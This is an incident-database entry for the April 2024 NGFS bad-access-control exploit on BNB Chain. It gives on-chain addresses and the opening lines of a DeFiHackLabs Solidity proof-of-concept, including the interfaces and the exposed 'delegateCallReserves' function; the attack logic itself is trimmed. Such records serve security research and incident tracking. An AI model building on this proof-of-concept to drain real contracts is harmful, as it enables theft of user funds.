# [?] NGFS - Bad Access Control

## Summary
Severity: Unknown
Chain: BNB Chain
Component: NGFS
Published: 2024-04-25
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/NGFS_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~190K

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost: ~190K
// Attacker: https://bscscan.com/address/0xd03d360dfc1dac7935e114d564a088077e6754a0
// Attack Contract: https://bscscan.com/address/0xc73781107d086754314f7720ca14ab8c5ad035e4
// Vulnerable Contract: https://bscscan.com/address/0xa608985f5b40cdf6862bec775207f84280a91e3a
// Attack Tx: https://bscscan.com/tx/0x8ff764dde572928c353716358e271638fa05af54be69f043df72ad9ad054de25

// @Info
// Vulnerable Contract Code: https://bscscan.com/address/0xa608985f5b40cdf6862bec775207f84280a91e3a#code

// @Analysis
// Post-mortem: https://louistsai.vercel.app/p/2024-04-25-ngfs-exploit/
// Twitter Guy: https://twitter.com/CertiKAlert/status/1783476515331616847
// Hacking God:

interface IPancakeFactory {
    function getPair(address, address) external returns (address);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface INGFSToken {
    function delegateCallReserves() external;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/NGFS_exp.sol_
